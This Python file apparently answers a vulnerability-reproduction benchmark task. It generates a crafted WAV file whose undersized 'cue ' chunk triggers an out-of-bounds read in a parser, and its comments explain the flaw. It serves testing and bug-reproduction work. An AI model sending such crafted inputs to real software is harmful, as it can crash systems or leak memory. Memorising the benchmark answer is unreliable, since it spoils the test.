import struct

class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generate a PoC that triggers the vulnerability.

        Args:
            src_path: Path to the vulnerable source code tarball

        Returns:
            bytes: The PoC input that should trigger the vulnerability
        """
        # The vulnerability is in the parsing of the 'cue ' chunk in a WAV file.
        # The code reads the number of cue points (dwNumCuePoints) and then
        # attempts to read that many 24-byte CUE_POINT structs from the chunk data,
        # but fails to validate this against the actual chunk size.
        #
        # PoC structure:
        # 1. RIFF/WAVE header (12 bytes)
        # 2. A standard 'fmt ' chunk to pass initial validation (24 bytes)
        # 3. A malicious 'cue ' chunk where the number of cue points implies a
        #    data size larger than the actual chunk data size. (22 bytes)
        # Total length: 12 + 24 + 22 = 58 bytes.

        # RIFF Header (12 bytes)
        # Total file size is 58 bytes. The size field in the RIFF header is
        # file size - 8, so 50.
        poc = b'RIFF'
        poc += struct.pack('<I', 50)
        poc += b'WAVE'

        # 'fmt ' chunk (24 bytes total)
        poc += b'fmt '
        poc += struct.pack('<I', 16)         # chunk data size
        poc += struct.pack('<H', 1)          # wFormatTag (PCM)
        poc += struct.pack('<H', 1)          # nChannels
        poc += struct.pack('<I', 8000)       # nSamplesPerSec
        poc += struct.pack('<I', 16000)      # nAvgBytesPerSec
        poc += struct.pack('<H', 2)          # nBlockAlign
        poc += struct.pack('<H', 16)         # wBitsPerSample

        # Malicious 'cue ' chunk (22 bytes total)
        poc += b'cue '
        # Chunk data size: 14 bytes. This is intentionally too small.
        chunk_data_size = 14
        poc += struct.pack('<I', chunk_data_size)

        # Chunk data (14 bytes) starts here.
        # dwNumCuePoints is set to 1.
        # The code will expect data for 1 cue point, which requires:
        # 4 bytes (for dwNumCuePoints) + 1 * 24 bytes (for one CUE_POINT struct) = 28 bytes.
        # Since the chunk data size is only 14, reading the full CUE_POINT struct
        # will cause an out-of-bounds read.
        poc += struct.pack('<I', 1) # dwNumCuePoints

        # The rest of the chunk data. We have 14 - 4 = 10 bytes left to fill.
        poc += b'\x00' * 10
        
        return poc